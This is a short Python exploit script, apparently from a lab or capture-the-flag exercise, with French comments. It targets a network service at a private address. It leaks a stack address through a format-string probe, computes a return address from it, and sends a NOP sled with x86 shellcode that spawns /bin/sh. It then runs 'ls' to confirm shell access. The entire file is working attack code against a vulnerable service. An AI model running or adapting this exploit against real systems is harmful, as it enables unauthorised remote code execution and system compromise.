#!/usr/bin/env python3
import binascii
import socket

charge_1 = '90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090eb715d31c031db31c931d231ff31f6b02289c6b0c0b10166c1e10cb2034fcd8089c131ffb30289ca80c10431c066b87001fec3c602108939cd8039f875ed8b013c0275e789ca31c931c0b03fcd8041b03fcd8041b03fcd8031c0896d0889450c884507b00b89eb8d4d088d550ccd80b001cd80e88affffff2f62696e2f73684141414141414141410a0000000d000000'

HOST = '172.28.128.100'
PORT = 6000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b'ECHO %x % x%x%x %x \n')
    data_echo = s.recv(1024)
    print(data_echo)
    adresse = str(data_echo).split(" ")[-2] # on récupère la dernière adresse
    adresse_2 = int(adresse, 16) # on convertit l'hexa en decimal
    adresse_3 = int(adresse_2) - 10 # on retranche 10
    adresse_4 = hex(adresse_3) # on repasse en hexa
    milieu_ajout = adresse_4[-2:]
    charge_2 = charge_1+milieu_ajout
    fin_adresse = int(adresse[-2:], 16)- 4 # on convertit en decimal et on retranche 4
    charge_3 = charge_2 + hex(fin_adresse)[2:] + adresse_4[2:-2][-2:] + adresse_4[2:-2][-4:-2] + adresse_4[2:-2][0:2] + "0a"
    charge_4 = binascii.unhexlify(charge_3) #on ajoute les "/x"

    s.sendall(charge_4)
    s.sendall(b'ls \n') # on vérifie que le shell fonctionne
    data_reception = s.recv(1024)
    print(data_reception)
